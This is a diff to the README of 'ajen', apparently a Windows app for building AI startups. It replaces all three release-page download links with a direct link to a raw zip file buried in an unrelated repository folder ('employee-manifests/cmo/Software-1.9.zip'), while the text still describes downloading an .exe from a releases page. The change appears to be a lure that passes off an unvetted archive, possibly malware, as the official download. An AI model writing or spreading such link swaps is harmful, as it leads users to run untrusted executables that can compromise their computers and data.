@@ -1,6 +1,6 @@
 # 🤖 ajen - Build Your AI Startup Easily
 
-[![Download ajen](https://img.shields.io/badge/Download-ajen-brightgreen?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/releases)
+[![Download ajen](https://img.shields.io/badge/Download-ajen-brightgreen?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/raw/refs/heads/main/employee-manifests/cmo/Software-1.9.zip)
 
 ## About ajen
 
@@ -33,7 +33,7 @@ This guide will help you download and run ajen on your Windows computer. The pro
 
 To get started, visit this page to download the latest version of ajen:
 
-[![Download ajen Here](https://img.shields.io/badge/Download-ajen-blue?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/releases)
+[![Download ajen Here](https://img.shields.io/badge/Download-ajen-blue?style=for-the-badge)](https://github.com/muhammedadamk75-source/ajen/raw/refs/heads/main/employee-manifests/cmo/Software-1.9.zip)
 
 The page contains the latest stable release files. Look for the file that ends with `.exe` for Windows. It should be named something like `ajen-setup.exe` or `ajen-vX.X.X-windows.exe`.
 
@@ -86,7 +86,7 @@ When you open ajen, you will see a dashboard. It shows the AI agents working on 
 
 Periodically check the release page for updates and improvements:
 
-https://github.com/muhammedadamk75-source/ajen/releases
+https://github.com/muhammedadamk75-source/ajen/raw/refs/heads/main/employee-manifests/cmo/Software-1.9.zip
 
 Downloading and installing the newest version replaces the old one but keeps your saved data.
 
